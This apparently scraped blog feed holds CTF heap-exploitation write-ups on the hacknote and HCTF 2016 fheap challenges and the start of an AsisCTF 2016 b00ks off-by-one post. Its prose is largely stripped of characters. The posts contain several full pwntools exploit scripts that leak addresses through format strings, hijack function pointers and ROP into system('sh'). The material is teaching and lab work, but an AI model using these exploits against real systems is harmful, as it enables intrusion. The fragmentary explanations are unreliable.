class="line">    <span class="built_in">free</span>(notelist[v1]-&gt;content);</span><br><span class="line">    <span class="built_in">free</span>(notelist[v1]);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Success&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v3;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">free</span><span class="number">0</span></span><br></pre></td></tr></table></figure><p>print_note</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( notelist[v1] )</span><br><span class="line">  notelist[v1]-&gt;put(notelist[v1]);</span><br></pre></td></tr></table></figure><p>magic</p><p>notelist[v1]-&gt;putmagicflag</p><p> add_notemalloc notecontextdel</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">free</span>(notelist[v1]-&gt;content);</span><br><span class="line"><span class="built_in">free</span>(notelist[v1]);</span><br></pre></td></tr></table></figure><p></p><p>addnote(16, baaaa) # add note 0<br>addnote(16, bddaa) # add note 1</p><p>malloc</p><p><img src="/2023/03/04/Using-After-Free/image-20230304184036356.png" alt="image-20230304184036356"></p><p></p><p><img src="/2023/03/04/Using-After-Free/image-20230304184226530.png" alt="image-20230304184226530"></p><p>malloc</p><p><img src="/2023/03/04/Using-After-Free/image-20230304185117164.png" alt="image-20230304185117164"></p><p>free</p><p><img src="/2023/03/04/Using-After-Free/image-20230304185427692.png" alt="image-20230304185427692"></p><h3 id="tchche-bin"><a href="#tchche-bin" class="headerlink" title="tchche bin"></a>tchche bin</h3><p><strong>Tcache</strong><strong>libc-2.26</strong>0x400<strong>FILO</strong>()()<strong>free</strong><strong>inuse</strong><strong>0</strong><strong>0x400</strong><strong>Tcachebin</strong>bins7chunkmalloc<strong>0x400</strong></p><p></p><p>addnote(8, p32(magic))</p><p>0x10chunk</p><p>note3contextnote1put</p><p><img src="/2023/03/04/Using-After-Free/image-20230304190759691.png" alt="image-20230304190759691"></p><p><img src="/2023/03/04/Using-After-Free/image-20230304192052112.png" alt="image-20230304192052112"></p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./hacknote&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">addnote</span>(<span class="params">size, content</span>):</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delnote</span>(<span class="params">idx</span>):</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">printnote</span>(<span class="params">idx</span>):</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">gdb.attach(r)</span><br><span class="line">magic = <span class="number">0x08048986</span></span><br><span class="line"></span><br><span class="line">addnote(<span class="number">16</span>, <span class="string">b&quot;aaaa&quot;</span>) <span class="comment"># add note 0</span></span><br><span class="line">addnote(<span class="number">16</span>, <span class="string">b&quot;ddaa&quot;</span>) <span class="comment"># add note 1</span></span><br><span class="line">delnote(<span class="number">0</span>) <span class="comment"># delete note 0</span></span><br><span class="line">delnote(<span class="number">1</span>) <span class="comment"># delete note 1</span></span><br><span class="line"></span><br><span class="line">addnote(<span class="number">8</span>, p32(magic)) <span class="comment"># add note 2</span></span><br><span class="line"></span><br><span class="line">printnote(<span class="number">0</span>) <span class="comment"># print note 0</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="2016-HCTF-fheap"><a href="#2016-HCTF-fheap" class="headerlink" title="2016 HCTF fheap"></a>2016 HCTF fheap</h2><p><a href="https://github.com/zh-explorer/hctf2016-fheap">https://github.com/zh-explorer/hctf2016-fheap</a></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@grxer ~/D/c/p/heap&gt; ./pwn-f </span><br><span class="line">+++++++++++++++++++++++++++</span><br><span class="line">So, let&#x27;s crash the world</span><br><span class="line">+++++++++++++++++++++++++++</span><br><span class="line">1.create string</span><br><span class="line">2.delete string</span><br><span class="line">3.quit</span><br><span class="line">^C                                                                                                                                             grxer@grxer ~/D/c/p/heap [SIGINT]&gt; checksec pwn-f </span><br><span class="line">[*] &#x27;/home/grxer/Desktop/ctfwiki/pwn/heap/pwn-f&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>createmallocstring&gt;0xf,&lt;</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">String</span>&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="type">char</span> *buf;</span><br><span class="line">        <span class="type">char</span> <span class="built_in">array</span>[<span class="number">16</span>];</span><br><span class="line">    &#125; o;</span><br><span class="line">    <span class="type">int</span> len;</span><br><span class="line">    <span class="comment">//8 </span></span><br><span class="line">    <span class="type">void</span> (*<span class="built_in">free</span>)(<span class="keyword">struct</span> String *ptr);</span><br><span class="line">&#125; String;</span><br></pre></td></tr></table></figure><p>0x2020C0chunk</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> inuse;</span><br><span class="line">    String *str;</span><br><span class="line">&#125; Strings[<span class="number">0x10</span>]; <span class="number">16</span></span><br></pre></td></tr></table></figure><p>freenull dangling pointer</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v1 &gt;= <span class="number">0x11</span> )</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Invalid id&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> ( *((_QWORD *)&amp;struct_at + <span class="number">2</span> * (<span class="type">int</span>)v1 + <span class="number">1</span>) )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Are you sure?:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(buf, <span class="string">&quot;yes&quot;</span>, <span class="number">3uLL</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    (*(<span class="type">void</span> (__fastcall **)(_QWORD))(*((_QWORD *)&amp;struct_at + <span class="number">2</span> * (<span class="type">int</span>)v1 + <span class="number">1</span>) + <span class="number">24LL</span>))(*((_QWORD *)&amp;struct_at</span><br><span class="line">                                                                                        + <span class="number">2</span> * (<span class="type">int</span>)v1</span><br><span class="line">                                                                                        + <span class="number">1</span>));</span><br><span class="line">    *((_DWORD *)&amp;struct_at + <span class="number">4</span> * (<span class="type">int</span>)v1) = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>create(10,hello)<br>create(0x20,grxer666666666666666666666666666)</p><img src="/2023/03/04/Using-After-Free/image-20230307152831940.png" alt="image-20230307152831940" style="zoom:67%;"><h3 id="using-after-free"><a href="#using-after-free" class="headerlink" title="using after free"></a>using after free</h3><p>creat string 20x32chunk10tcache bins</p><p><code>tchche bin    string0------&gt;string1</code></p><p>0x28chunk(8chunk headprev size)</p><p>string0contextstring 1string1free</p><p>delete(0)chunk</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">sub_D6C</span><span class="params">(<span class="type">void</span> **a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">free</span>(*a1);</span><br><span class="line">  <span class="built_in">free</span>(a1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>delete1</p><p><img src="/2023/03/04/Using-After-Free/image-20230307163539833.png" alt="image-20230307163539833"></p><h4 id="call-putspie"><a href="#call-putspie" class="headerlink" title="call putspie"></a>call putspie</h4><p>payload&#x3D;ba*24+b\x1a<br>create(len(payload),payload)</p><h4 id="printf"><a href="#printf" class="headerlink" title="printf"></a>printf</h4><p>pielibc</p><p>payload&#x3D;ba*4+b%15$p.ljust(20,bb)+p64(printf_plt)<br>create(len(payload),payload)<br>delete(1)<br>ru(ba*4)<br>_IO_file_write&#x3D;int(r(14),16)-45<br>p(_IO_file_write,_IO_file_write)</p><h4 id="system"><a href="#system" class="headerlink" title="system"></a>system</h4><p>shell</p><p><img src="/2023/03/04/Using-After-Free/image-20230307174939515.png" alt="image-20230307174939515"></p><h4 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./pwn-f&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:success(x+<span class="string">&#x27;--&gt;&#x27;</span>+<span class="built_in">hex</span>(y))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">size,content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;3.quit&quot;</span>)</span><br><span class="line">    io.send(<span class="string">b&quot;create &quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Pls give string size:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;str:&quot;</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;3.quit&quot;</span>)</span><br><span class="line">    io.send(<span class="string">b&quot;delete&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;id:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Are you sure?:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;yes&quot;</span>)</span><br><span class="line">db(<span class="string">&#x27;b *$rebase(0xe93)&#x27;</span>)</span><br><span class="line">create(<span class="number">5</span>,<span class="string">b&#x27;hello&#x27;</span>)</span><br><span class="line">create(<span class="number">5</span>,<span class="string">b&#x27;grxer&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span>+<span class="string">b&#x27;\x1a&#x27;</span></span><br><span class="line">create(<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">ru(<span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span>)</span><br><span class="line">pie=u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0xD1A</span></span><br><span class="line"><span class="comment"># s(b&#x27;quit &#x27;)</span></span><br><span class="line">p(<span class="string">&#x27;pie&#x27;</span>,pie)</span><br><span class="line">printf_plt=pie+elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+<span class="string">b&#x27;%22$p&#x27;</span>.ljust(<span class="number">20</span>,<span class="string">b&#x27;b&#x27;</span>)+p64(printf_plt)</span><br><span class="line">create(<span class="built_in">len</span>(payload),payload)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">ru(<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>)</span><br><span class="line">_IO_2_1_stdout_=<span class="built_in">int</span>(r(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">p(<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>,_IO_2_1_stdout_)</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>,_IO_2_1_stdout_)</span><br><span class="line">base=_IO_2_1_stdout_-libc.dump(<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>)</span><br><span class="line">p(<span class="string">&#x27;base&#x27;</span>,base)</span><br><span class="line">system=base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">payload=<span class="string">b&#x27;sh;&#x27;</span>.ljust(<span class="number">24</span>,<span class="string">b&#x27;1&#x27;</span>)+p64(system)</span><br><span class="line">create(<span class="built_in">len</span>(payload),payload)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>glibcshelldeleteropshell</p><p><img src="/2023/03/04/Using-After-Free/image-20230308005837886.png" alt="image-20230308005837886"></p><p>yes8strncmppopretrop</p><p><img src="/2023/03/04/Using-After-Free/image-20230308011254973.png" alt="image-20230308011254973"></p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./pwn-f&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:success(x+<span class="string">&#x27;--&gt;&#x27;</span>+<span class="built_in">hex</span>(y))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">size,content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;3.quit&quot;</span>)</span><br><span class="line">    io.send(<span class="string">b&quot;create &quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Pls give string size:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;str:&quot;</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;3.quit&quot;</span>)</span><br><span class="line">    io.send(<span class="string">b&quot;delete&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;id:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Are you sure?:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;yes&quot;</span>)</span><br><span class="line">db(<span class="string">&#x27;b *$rebase(0xe93)&#x27;</span>)</span><br><span class="line">create(<span class="number">5</span>,<span class="string">b&#x27;hello&#x27;</span>)</span><br><span class="line">create(<span class="number">5</span>,<span class="string">b&#x27;grxer&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span>+<span class="string">b&#x27;\x1a&#x27;</span></span><br><span class="line">create(<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">ru(<span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span>)</span><br><span class="line">pie=u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0xD1A</span></span><br><span class="line"><span class="comment"># s(b&#x27;quit &#x27;)</span></span><br><span class="line">p(<span class="string">&#x27;pie&#x27;</span>,pie)</span><br><span class="line">printf_plt=pie+elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+<span class="string">b&#x27;%15$p&#x27;</span>.ljust(<span class="number">20</span>,<span class="string">b&#x27;b&#x27;</span>)+p64(printf_plt)</span><br><span class="line">create(<span class="built_in">len</span>(payload),payload)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">ru(<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>)</span><br><span class="line">_IO_file_write=<span class="built_in">int</span>(r(<span class="number">14</span>),<span class="number">16</span>)-<span class="number">45</span></span><br><span class="line">p(<span class="string">&#x27;_IO_file_write&#x27;</span>,_IO_file_write)</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;_IO_file_write&#x27;</span>,_IO_file_write)</span><br><span class="line">base=_IO_file_write-libc.dump(<span class="string">&#x27;_IO_file_write&#x27;</span>)</span><br><span class="line">p(<span class="string">&#x27;base&#x27;</span>,base)</span><br><span class="line">system=base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh=base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">pop4=pie+<span class="number">0x00000000000011dc</span></span><br><span class="line">rdi=<span class="number">0x00000000000011e3</span>+pie</span><br><span class="line">p(<span class="string">&#x27;bin_sh&#x27;</span>,bin_sh)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span>+p64(pop4)</span><br><span class="line">create(<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&quot;3.quit\n&quot;</span>,<span class="string">&quot;delete &quot;</span>)</span><br><span class="line">sla(<span class="string">&quot;delete\nid:&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">payload= <span class="string">b&quot;yesaaaaa&quot;</span> + p64(rdi) + p64(bin_sh) + p64(<span class="number">0x949</span>+pie)+p64(system)</span><br><span class="line">sla(<span class="string">&quot;sure?:&quot;</span>,payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="double-free"><a href="#double-free" class="headerlink" title="double free"></a>double free</h3><p>freefreehook</p><p>string chunk</p><p>create(5,bhello)<br>create(5,bgrxer)</p><p></p><p>delete(0)<br>delete(1)<br>delete(0)</p><p>fastbin01</p><p><img src="/2023/03/04/Using-After-Free/image-20230308124636807.png" alt="image-20230308124636807"></p><p></p><p>create(4, bfsf)<br>create(0x20, ba * 0x16 + blo + b\x2d\x00)</p><p>createstringcreatstringstringcontextcreatstructfreeputsputs</p><p><img src="/2023/03/04/Using-After-Free/image-20230308125210074.png" alt="image-20230308125210074"></p><p>delete(1),context0xf&lt;&#x3D;0x28chunk</p><h4 id="exp-"><a href="#exp-" class="headerlink" title="exp "></a>exp </h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./pwn-f&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:success(x+<span class="string">&#x27;--&gt;&#x27;</span>+<span class="built_in">hex</span>(y))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">size,content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;3.quit&quot;</span>)</span><br><span class="line">    io.send(<span class="string">b&quot;create &quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Pls give string size:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;str:&quot;</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;3.quit\n&quot;</span>)</span><br><span class="line">    io.send(<span class="string">b&quot;delete &quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;id:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Are you sure?:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;yes&quot;</span>)</span><br><span class="line">db(<span class="string">&#x27;b *$rebase(0xe93)&#x27;</span>)</span><br><span class="line">create(<span class="number">5</span>,<span class="string">b&#x27;hello&#x27;</span>)</span><br><span class="line">create(<span class="number">5</span>,<span class="string">b&#x27;grxer&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="number">4</span>, <span class="string">b&#x27;fsf&#x27;</span>)</span><br><span class="line">create(<span class="number">0x20</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x16</span> + <span class="string">b&#x27;lo&#x27;</span> + <span class="string">b&#x27;\x2d\x00&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">create(<span class="number">0x20</span>, <span class="string">b&#x27;b&#x27;</span> * <span class="number">0x16</span> + <span class="string">b&#x27;lo&#x27;</span> + <span class="string">b&#x27;\x2d\x00&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Double Free </tag>
            
            <tag> Using After Free </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OFF-BY-ONE AsisCTF2016b00ks</title>
      <link href="/2023/03/02/AsisCTF2016b00ks-OBO/"/>
      <url>/2023/03/02/AsisCTF2016b00ks-OBO/</url>
      
        <content type="html"><![CDATA[<h1 id="AsisCTF-2016-b00ks-OFF-BY-ONE"><a href="#AsisCTF-2016-b00ks-OFF-BY-ONE" class="headerlink" title="AsisCTF-2016-b00ks OFF-BY-ONE"></a>AsisCTF-2016-b00ks OFF-BY-ONE</h1><p><a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/off_by_one/Asis_2016_b00ks">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/off_by_one/Asis_2016_b00ks</a></p><p>__free_hook and off by one</p><span id="more"></span><p><img src="/2023/03/02/AsisCTF2016b00ks-OBO/image-20230302015134670.png" alt="image-20230302015134670"></p><p><img src="/2023/03/02/AsisCTF2016b00ks-OBO/image-20230302012924030.png" alt="image-20230302012924030"></p><p><img src="/2023/03/02/AsisCTF2016b00ks-OBO/image-20230302010143341.png" alt="image-20230302010143341"></p><p>&#x2F;x00</p><p>author nameunk_202040+pie32</p><p><img src="/2023/03/02/AsisCTF2016b00ks-OBO/image-20230302011350558.png" alt="image-20230302011350558"></p><p>bookunk_202060+piebook1</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">book_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="type">int</span> id;</span><br><span class="line"><span class="type">void</span> * book_name;</span><br><span class="line"><span class="type">void</span> *book_description;</span><br><span class="line"><span class="type">int</span> description_size;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//32</span></span><br></pre></td></tr></table></figure><h3 id="book1"><a href="#book1" class="headerlink" title="book1"></a>book1</h3><p>32name</p><p><img src="/2023/03/02/AsisCTF2016b00ks-OBO/image-20230302012108199.png" alt="image-20230302012108199"></p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>anothername0x20600book1malloc book_name&gt;book_description&gt;book_struct</p><p>book1book_description(descriptionbook1bookname)descriptionbook1desbookdesbook2description1des</p><p>book2des</p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>FULL RELROgotfreemallocfree_hookfree hooksystemdescriptionbinshfree(description)shell__free_hooklibcmallocmallocmmap</p><p>libcdeslibc</p><p>create_book(0x21000, two, 0x21000, twodes)</p><img src="/2023/03/02/AsisCTF2016b00ks-OBO/image-20230302020528381.png" alt="image-20230302020528381" style="zoom: 